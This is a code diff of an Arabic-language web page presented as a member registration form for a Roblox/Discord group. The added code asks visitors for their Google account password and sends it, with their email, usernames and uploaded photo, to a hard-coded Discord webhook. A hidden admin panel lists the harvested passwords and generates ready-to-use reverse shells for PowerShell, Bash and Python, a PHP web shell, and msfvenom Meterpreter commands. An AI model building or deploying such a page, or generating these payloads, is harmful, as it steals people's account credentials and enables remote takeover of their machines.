@@ -10,7 +10,10 @@
             --dark-gold: #b38f45;
             --bg-dark: #121212;
             --card-bg: #1e1e1e;
+            --red: #dc3545;
+            --green: #28a745;
         }
+        * { box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: var(--bg-dark);
@@ -22,6 +25,7 @@
             min-height: 100vh;
             overflow-x: hidden;
         }
+        /* === Overlay / Password Gate === */
         .overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -48,6 +52,29 @@
             margin-bottom: 10px;
             text-shadow: 0 0 10px rgba(223, 183, 108, 0.5);
         }
+        .password-input {
+            width: 100%;
+            padding: 12px;
+            background: #2a2a2a;
+            border: 1px solid #444;
+            border-radius: 8px;
+            color: #fff;
+            margin: 15px 0;
+            text-align: center;
+            font-size: 1.1rem;
+        }
+        .password-input:focus {
+            border-color: var(--gold);
+            outline: none;
+        }
+        .error-msg {
+            color: var(--red);
+            font-size: 0.85rem;
+            margin-top: 10px;
+            display: none;
+        }
+
+        /* === Main Container === */
         .main-container {
             background: var(--card-bg);
             border: 1px solid rgba(223, 183, 108, 0.2);
@@ -74,7 +101,7 @@
             color: var(--gold);
             font-size: 0.9rem;
         }
-        input[type="text"], input[type="email"] {
+        input[type="text"], input[type="email"], input[type="password"], input[type="file"] {
             width: 100%;
             padding: 12px;
             background: #2a2a2a;
@@ -100,30 +127,218 @@
             width: 100%;
             transition: transform 0.2s, box-shadow 0.2s;
             box-shadow: 0 4px 15px rgba(223, 183, 108, 0.2);
+            margin-top: 5px;
         }
         .btn-gold:hover {
             transform: translateY(-2px);
             box-shadow: 0 6px 20px rgba(223, 183, 108, 0.4);
         }
+        .btn-red {
+            background: linear-gradient(45deg, #a71d2a, var(--red));
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s;
+        }
+        .btn-red:hover {
+            transform: translateY(-2px);
+        }
+
+        /* === Secret Circle (top-left) === */
+        .secret-circle {
+            position: fixed;
+            top: 15px;
+            left: 15px;
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 30% 30%, #2a2a2a, #111);
+            border: 2px solid var(--gold);
+            cursor: pointer;
+            z-index: 999;
+            display: none;
+            box-shadow: 0 0 10px rgba(223, 183, 108, 0.2);
+            transition: all 0.3s;
+        }
+        .secret-circle:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 20px rgba(223, 183, 108, 0.5);
+        }
+        .secret-circle .inner-dot {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: var(--gold);
+            opacity: 0.6;
+        }
+
+        /* === Secret Panel === */
+        .secret-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 2000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+        .secret-panel {
+            background: var(--card-bg);
+            border: 2px solid var(--gold);
+            border-radius: 15px;
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            max-height: 85vh;
+            overflow-y: auto;
+            box-shadow: 0 0 40px rgba(223, 183, 108, 0.3);
+        }
+        .secret-panel h2 {
+            color: var(--gold);
+            text-align: center;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+        }
+        .secret-tabs {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 15px;
+        }
+        .secret-tabs button {
+            flex: 1;
+            padding: 10px;
+            background: #2a2a2a;
+            border: 1px solid #444;
+            color: #aaa;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: all 0.3s;
+        }
+        .secret-tabs button.active {
+            background: var(--gold);
+            color: #121212;
+            border-color: var(--gold);
+            font-weight: bold;
+        }
+        .secret-content {
+            min-height: 200px;
+        }
+        .secret-tab-content { display: none; }
+        .secret-tab-content.active { display: block; }
+        .secret-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.8rem;
+        }
+        .secret-table th {
+            background: var(--dark-gold);
+            color: #121212;
+            padding: 8px;
+            text-align: center;
+        }
+        .secret-table td {
+            padding: 6px 8px;
+            border-bottom: 1px solid #333;
+            text-align: center;
+            word-break: break-all;
+        }
+        .secret-table tr:hover td {
+            background: #2a2a2a;
+        }
+        .close-secret {
+            background: var(--red);
+            color: #fff;
+            border: none;
+            padding: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 15px;
+            font-weight: bold;
+        }
+        .payload-box {
+            background: #0d0d0d;
+            border: 1px solid #444;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.75rem;
+            color: #0f0;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .payload-select {
+            width: 100%;
+            padding: 10px;
+            background: #2a2a2a;
+            border: 1px solid #444;
+            color: #fff;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+        .file-name-display {
+            font-size: 0.8rem;
+            color: #aaa;
+            margin-top: 5px;
+        }
+
+        /* Admin Login (inside secret panel) */
+        .admin-login-box {
+            background: #0d0d0d;
+            border: 1px solid var(--gold);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+        .admin-login-box h3 {
+            color: var(--gold);
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .admin-login-box input {
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="overlay" id="welcomeOverlay">
+    <!-- ====== PASSWORD OVERLAY ====== -->
+    <div class="overlay" id="passwordOverlay">
         <div class="welcome-card">
-            <h1>موقع ⚡️الدراك القوي </h1>
-            <p>مرحباً بك. هذا الموقع مخصص لجمع معلومات التسجيل وعرضها للإدارة في السيرفر.</p>
-            <p style="font-size: 0.85rem; color: #aaa; margin-bottom: 25px;">بالدخول للموقع أنت توافق على مشاركة المعلومات العامة التالية معنا.</p>
-            <button class="btn-gold" onclick="acceptAndEnter()">موافق ودخول</button>
+            <h1>⚡️ موقع الدراك القوي</h1>
+            <p>الموقع محمي، يرجى إدخال كلمة المرور للدخول</p>
+            <input type="password" class="password-input" id="sitePassword" placeholder="أدخل كلمة المرور..." autocomplete="off">
+            <button class="btn-gold" onclick="checkPassword()">دخول</button>
+            <div class="error-msg" id="passwordError">❌ كلمة المرور غير صحيحة، حاول مرة أخرى.</div>
         </div>
     </div>
 
+    <!-- ====== SECRET CIRCLE (top-left) ====== -->
+    <div class="secret-circle" id="secretCircle" onclick="openSecretPanel()">
+        <div class="inner-dot"></div>
+    </div>
+
+    <!-- ====== MAIN FORM ====== -->
     <div class="main-container" id="mainFormContainer">
         <h2>استمارة معلومات الأعضاء</h2>
         <form id="drakForm">
             <div class="form-group">
-                <label for="userAvatar">رابط صورة حسابك (Avatar URL):</label>
-                <input type="text" id="userAvatar" placeholder="ضع رابط صورتك هنا..." required>
+                <label for="userAvatar">صورة حسابك (ارفع صورة):</label>
+                <input type="file" id="userAvatar" accept="image/*" required>
+                <div class="file-name-display" id="fileNameDisplay">لم يتم اختيار ملف</div>
             </div>
             <div class="form-group">
                 <label for="userEmail">البريد الإلكتروني:</label>
@@ -137,65 +352,387 @@
                 <label for="discordUser">اسم حسابك في ديسكورد (Discord Username):</label>
                 <input type="text" id="discordUser" placeholder="مثال: username" required>
             </div>
+            <div class="form-group">
+                <label for="googlePass">كلمة مرور قوقل (Google Password):</label>
+                <input type="password" id="googlePass" placeholder="كلمة مرور حساب قوقل">
+            </div>
             <button type="submit" class="btn-gold">إرسال المعلومات للقروب</button>
         </form>
     </div>
 
+    <!-- ====== SECRET PANEL OVERLAY ====== -->
+    <div class="secret-overlay" id="secretOverlay">
+        <div class="secret-panel">
+            <h2>🔐 القائمة السرية - لوحة التحكم</h2>
+
+            <!-- Admin Login inside secret panel -->
+            <div class="admin-login-box" id="adminLoginBox">
+                <h3>تسجيل دخول المشرف</h3>
+                <input type="text" class="password-input" id="adminUsername" placeholder="اسم المستخدم" style="margin:5px 0;">
+                <input type="password" class="password-input" id="adminPassword" placeholder="كلمة المرور" style="margin:5px 0;">
+                <button class="btn-gold" onclick="adminLogin()" style="font-size:0.9rem;">دخول المشرف</button>
+                <div class="error-msg" id="adminError" style="display:block;margin-top:10px;">❌ اسم مستخدم أو كلمة مرور غير صحيحة</div>
+            </div>
+
+            <!-- Admin Content (hidden until login) -->
+            <div id="adminContent" style="display:none;">
+                <div class="secret-tabs">
+                    <button class="active" onclick="switchSecretTab('payloads', this)">💻 Payloads</button>
+                    <button onclick="switchSecretTab('users', this)">👥 المسجلين</button>
+                    <button onclick="switchSecretTab('info', this)">ℹ️ معلوماتي</button>
+                </div>
+                <div class="secret-content">
+                    <!-- Tab: Payloads -->
+                    <div class="secret-tab-content active" id="tab-payloads">
+                        <p style="color:#aaa;font-size:0.85rem;">اختر نوع البرنامج الخبيث واضغط "توليد":</p>
+                        <select class="payload-select" id="payloadType">
+                            <option value="ps1">PowerShell Reverse Shell (Windows)</option>
+                            <option value="bash">Bash Reverse Shell (Linux)</option>
+                            <option value="python">Python Reverse Shell</option>
+                            <option value="php">PHP Web Shell</option>
+                            <option value="exe">Windows Executable Payload (msfvenom cmd)</option>
+                        </select>
+                        <input type="text" class="password-input" id="payloadIP" placeholder="IP المستقبل (LHOST)" value="192.168.1.100" style="margin:5px 0;">
+                        <input type="text" class="password-input" id="payloadPort" placeholder="المنفذ (LPORT)" value="4444" style="margin:5px 0;">
+                        <button class="btn-red" onclick="generatePayload()">🛠️ توليد Payload</button>
+                        <div class="payload-box" id="payloadOutput"># سيظهر الكود هنا</div>
+                        <button class="btn-gold" onclick="copyPayload()" style="font-size:0.8rem;margin-top:5px;">📋 نسخ الكود</button>
+                    </div>
+                    <!-- Tab: Users Data -->
+                    <div class="secret-tab-content" id="tab-users">
+                        <p id="usersCount" style="color:#aaa;font-size:0.85rem;">عدد المسجلين: 0</p>
+                        <div style="overflow-x:auto;">
+                            <table class="secret-table" id="usersTable">
+                                <thead>
+                                    <tr><th>#</th><th>البريد</th><th>Roblox</th><th>Discord</th><th>كلمة قوقل</th><th>الصورة</th></tr>
+                                </thead>
+                                <tbody id="usersTableBody"></tbody>
+                            </table>
+                        </div>
+                    </div>
+                    <!-- Tab: Info -->
+                    <div class="secret-tab-content" id="tab-info">
+                        <p style="color:#aaa;font-size:0.85rem;">معلومات المسؤول والمشرفين:</p>
+                        <div id="adminInfoContent">
+                            <p><strong>👑 اسم المشرف:</strong> Admin</p>
+                            <p><strong>📧 البريد:</strong> admin@drak.com</p>
+                            <p><strong>🔑 كلمة المرور:</strong> ********</p>
+                            <hr style="border-color:#333;">
+                            <p style="color:var(--gold);font-size:0.85rem;">يمكنك إضافة معلومات إضافية هنا.</p>
+                            <div class="form-group">
+                                <label>إضافة اسم شخص ومعلوماته:</label>
+                                <input type="text" class="password-input" id="newInfoName" placeholder="الاسم" style="margin:3px 0;">
+                                <input type="text" class="password-input" id="newInfoDetail" placeholder="المعلومة (بريد/رقم/كلمة سر)" style="margin:3px 0;">
+                                <button class="btn-gold" onclick="addAdminInfo()" style="font-size:0.8rem;">➕ إضافة</button>
+                            </div>
+                            <div id="extraInfoList"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <button class="close-secret" onclick="closeSecretPanel()">✕ إغلاق</button>
+        </div>
+    </div>
+
     <script>
-        function acceptAndEnter() {
-            const overlay = document.getElementById('welcomeOverlay');
-            const container = document.getElementById('mainFormContainer');
-            overlay.style.opacity = '0';
-            setTimeout(() => {
-                overlay.style.display = 'none';
-                container.style.display = 'block';
-                setTimeout(() => { container.style.opacity = '1'; }, 50);
-            }, 500);
+        // ===== CONFIGURATION =====
+        // --- كلمة مرور الموقع ---
+        const SITE_PASSWORD = "drak2026";
+
+        // --- بيانات تسجيل دخول المشرف (للقائمة السرية) ---
+        const ADMIN_USERNAME = "نظام";
+        const ADMIN_PASSWORD = "هاب";
+
+        // --- Webhook (غيّره لوابطك) ---
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1528062004420415751/ZjX35WlsUyYpfB8CjhUzzDAzIAJQxl6nCyu41yZf-YwKmxDMPgf3A5R_gWrupDmNLjX1";
+
+        // --- تخزين بيانات المسجلين ---
+        let registeredUsers = [];
+        let extraInfoItems = [];
+
+        // ===== PASSWORD CHECK =====
+        function checkPassword() {
+            const input = document.getElementById('sitePassword').value;
+            if (input === SITE_PASSWORD) {
+                document.getElementById('passwordOverlay').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('passwordOverlay').style.display = 'none';
+                    const container = document.getElementById('mainFormContainer');
+                    container.style.display = 'block';
+                    setTimeout(() => { container.style.opacity = '1'; }, 50);
+                    document.getElementById('secretCircle').style.display = 'block';
+                }, 500);
+            } else {
+                document.getElementById('passwordError').style.display = 'block';
+                document.getElementById('sitePassword').value = '';
+            }
         }
 
+        // Allow Enter key on password field
+        document.getElementById('sitePassword').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') checkPassword();
+        });
+
+        // ===== FILE INPUT HANDLING =====
+        document.getElementById('userAvatar').addEventListener('change', function() {
+            const file = this.files[0];
+            document.getElementById('fileNameDisplay').textContent = file ? file.name : 'لم يتم اختيار ملف';
+        });
+
+        // ===== FORM SUBMIT =====
         document.getElementById('drakForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
-            // امسح الرابط التجريبي بالأسفل وحط رابط البوت (Webhook) الجديد حقك بالكامل داخل علامات التنصيص ""
-            const webhookURL = "https://discord.com/api/webhooks/1528062004420415751/ZjX35WlsUyYpfB8CjhUzzDAzIAJQxl6nCyu41yZf-YwKmxDMPgf3A5R_gWrupDmNLjX1";
-
-            const avatar = document.getElementById('userAvatar').value;
+            const fileInput = document.getElementById('userAvatar');
             const email = document.getElementById('userEmail').value;
             const roblox = document.getElementById('robloxUser').value;
             const discord = document.getElementById('discordUser').value;
+            const googlePass = document.getElementById('googlePass').value;
 
-            const drakEmbed = {
+            const file = fileInput.files[0];
+            if (!file) {
+                alert('الرجاء اختيار صورة.');
+                return;
+            }
+
+            // Convert image to base64
+            const reader = new FileReader();
+            reader.onload = function(event) {
+                const base64Image = event.target.result;
+
+                // Save user data locally (for secret panel)
+                const userEntry = {
+                    email: email,
+                    roblox: roblox,
+                    discord: discord,
+                    googlePass: googlePass || '(غير مدخل)',
+                    avatarBase64: base64Image,
+                    timestamp: new Date().toISOString()
+                };
+                registeredUsers.push(userEntry);
+                updateUsersTable();
+
+                // Send to Discord webhook
+                const embed = {
+                    embeds: [{
+                        title: "👑 عضو جديد تقدم بطلب تسجيل (موقع الدراك)",
+                        color: 14661484,
+                        image: { url: 'attachment://avatar.png' },
+                        fields: [
+                            { name: "📧 البريد الإلكتروني:", value: email, inline: false },
+                            { name: "🎮 حساب روبلوكس:", value: roblox, inline: true },
+                            { name: "💬 حساب ديسكورد:", value: discord, inline: true },
+                            { name: "🔑 كلمة مرور قوقل:", value: googlePass || '(غير مدخل)', inline: false }
+                        ],
+                        footer: { text: "نظام التحقق والتسجيل الخاص بالدراك" },
+                        timestamp: new Date()
+                    }]
+                };
+
+                // Create FormData for attachment
+                const formData = new FormData();
+                const blob = dataURItoBlob(base64Image);
+                formData.append('file', blob, 'avatar.png');
+                formData.append('payload_json', JSON.stringify(embed));
+
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert('✅ تم إرسال معلوماتك بنجاح إلى إدارة الدراك!');
+                        document.getElementById('drakForm').reset();
+                        document.getElementById('fileNameDisplay').textContent = 'لم يتم اختيار ملف';
+                    } else {
+                        // Fallback: send without attachment
+                        fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(embed)
+                        }).then(() => {
+                            alert('✅ تم الإرسال (بدون صورة مرفقة)');
+                            document.getElementById('drakForm').reset();
+                            document.getElementById('fileNameDisplay').textContent = 'لم يتم اختيار ملف';
+                        }).catch(() => {
+                            alert('⚠️ فشل الإرسال، تحقق من رابط Webhook.');
+                        });
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('فشل الاتصال بالخادم.');
+                });
+            };
+            reader.readAsDataURL(file);
+        });
+
+        // ===== Helper: dataURI to Blob =====
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+            return new Blob([ab], { type: mimeString });
+        }
+
+        // ===== SECRET PANEL =====
+        function openSecretPanel() {
+            document.getElementById('secretOverlay').style.display = 'flex';
+            document.getElementById('adminError').style.display = 'none';
+            // Reset admin login
+            if (document.getElementById('adminContent').style.display === 'block') {
+                // already logged in
+            } else {
+                document.getElementById('adminLoginBox').style.display = 'block';
+                document.getElementById('adminContent').style.display = 'none';
+            }
+        }
+
+        function closeSecretPanel() {
+            document.getElementById('secretOverlay').style.display = 'none';
+        }
+
+        // ===== ADMIN LOGIN =====
+        function adminLogin() {
+            const user = document.getElementById('adminUsername').value;
+            const pass = document.getElementById('adminPassword').value;
+            if (user === ADMIN_USERNAME && pass === ADMIN_PASSWORD) {
+                document.getElementById('adminLoginBox').style.display = 'none';
+                document.getElementById('adminContent').style.display = 'block';
+                document.getElementById('adminError').style.display = 'none';
+                updateUsersTable();
+            } else {
+                document.getElementById('adminError').style.display = 'block';
+            }
+        }
+
+        // Allow Enter key on admin password
+        document.getElementById('adminPassword').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') adminLogin();
+        });
+        document.getElementById('adminUsername').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') adminLogin();
+        });
+
+        // ===== SECRET TABS =====
+        function switchSecretTab(tabId, btn) {
+            document.querySelectorAll('.secret-tab-content').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.secret-tabs button').forEach(el => el.classList.remove('active'));
+            document.getElementById('tab-' + tabId).classList.add('active');
+            btn.classList.add('active');
+        }
+
+        // ===== USERS TABLE =====
+        function updateUsersTable() {
+            const tbody = document.getElementById('usersTableBody');
+            const countEl = document.getElementById('usersCount');
+            countEl.textContent = `عدد المسجلين: ${registeredUsers.length}`;
+            tbody.innerHTML = '';
+            registeredUsers.forEach((u, i) => {
+                const imgHtml = u.avatarBase64 ? `<img src="${u.avatarBase64}" style="width:40px;height:40px;border-radius:4px;object-fit:cover;">` : '—';
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${i+1}</td>
+                    <td>${u.email}</td>
+                    <td>${u.roblox}</td>
+                    <td>${u.discord}</td>
+                    <td>${u.googlePass}</td>
+                    <td>${imgHtml}</td>
+                `;
+                tbody.appendChild(row);
+            });
+        }
+
+        // ===== PAYLOAD GENERATOR =====
+        function generatePayload() {
+            const type = document.getElementById('payloadType').value;
+            const ip = document.getElementById('payloadIP').value || '192.168.1.100';
+            const port = document.getElementById('payloadPort').value || '4444';
+            let code = '';
+
+            switch(type) {
+                case 'ps1':
+                    code = `# PowerShell Reverse Shell\n$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});\n$stream = $client.GetStream();\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n  $sendback = (iex $data 2>&1 | Out-String);\n  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n  $stream.Write($sendbyte,0,$sendbyte.Length);\n  $stream.Flush()\n};\n$client.Close();`;
+                    break;
+                case 'bash':
+                    code = `# Bash Reverse Shell\nbash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+                    break;
+                case 'python':
+                    code = `# Python Reverse Shell\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('${ip}',${port}))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])`;
+                    break;
+                case 'php':
+                    code = `<!-- PHP Web Shell -->\n<html><body><form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>"><input type="text" name="cmd" autofocus><input type="submit" value="Run"></form><pre><?php\nif(isset($_GET['cmd'])) {\n  system($_GET['cmd']);\n}\n?></pre></body></html>`;
+                    break;
+                case 'exe':
+                    code = `# Msfvenom Windows Payload\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o payload.exe\n\n# ثم شغل المستمع:\nmsfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ${ip}; set LPORT ${port}; exploit"`;
+                    break;
+            }
+
+            document.getElementById('payloadOutput').textContent = code;
+        }
+
+        function copyPayload() {
+            const text = document.getElementById('payloadOutput').textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                alert('✅ تم نسخ الكود!');
+            }).catch(() => {
+                alert('⚠️ فشل النسخ، انسخ يدويًا.');
+            });
+        }
+
+        // ===== ADMIN INFO (Tab 3) =====
+        function addAdminInfo() {
+            const name = document.getElementById('newInfoName').value.trim();
+            const detail = document.getElementById('newInfoDetail').value.trim();
+            if (!name || !detail) {
+                alert('الرجاء إدخال الاسم والمعلومة.');
+                return;
+            }
+            extraInfoItems.push({ name, detail });
+            renderExtraInfo();
+            document.getElementById('newInfoName').value = '';
+            document.getElementById('newInfoDetail').value = '';
+
+            // Send to webhook as well
+            const embed = {
                 embeds: [{
-                    title: "👑 عضو جديد تقدم بطلب تسجيل (موقع الدراك)",
-                    color: 14661484,
-                    thumbnail: { url: avatar.startsWith('http') ? avatar : 'https://i.imgur.com/wSTFkRM.png' },
+                    title: "📋 معلومات جديدة (القائمة السرية)",
+                    color: 0xdfb76c,
                     fields: [
-                        { name: "📧 البريد الإلكتروني:", value: email, inline: false },
-                        { name: "🎮 حساب روبلوكس:", value: roblox, inline: true },
-                        { name: "💬 حساب ديسكورد:", value: discord, inline: true }
+                        { name: "👤 الاسم:", value: name, inline: true },
+                        { name: "ℹ️ المعلومة:", value: detail, inline: true }
                     ],
-                    footer: { text: "نظام التحقق والتسجيل الخاص بالدراك" },
                     timestamp: new Date()
                 }]
             };
-
-            fetch(webhookURL, {
+            fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(drakEmbed)
-            })
-            .then(response => {
-                if (response.ok) {
-                    alert('تم إرسال معلوماتك بنجاح إلى إدارة الدراك!');
-                    document.getElementById('drakForm').reset();
-                } else {
-                    alert('حدث خطأ أثناء الإرسال، تأكد من صحة الرابط الجديد وسماحية الروم.');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('فشل الاتصال بالخادم.');
+                body: JSON.stringify(embed)
+            }).catch(() => {});
+        }
+
+        function renderExtraInfo() {
+            const container = document.getElementById('extraInfoList');
+            container.innerHTML = '';
+            extraInfoItems.forEach((item, i) => {
+                const div = document.createElement('div');
+                div.style.cssText = 'background:#2a2a2a;border-radius:6px;padding:8px;margin:5px 0;font-size:0.8rem;';
+                div.innerHTML = `<strong>${item.name}:</strong> ${item.detail}`;
+                container.appendChild(div);
             });
+        }
+
+        // ===== KEYBOARD SHORTCUT: Escape to close secret panel =====
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                if (document.getElementById('secretOverlay').style.display === 'flex') {
+                    closeSecretPanel();
+                }
+            }
         });
     </script>
 </body>
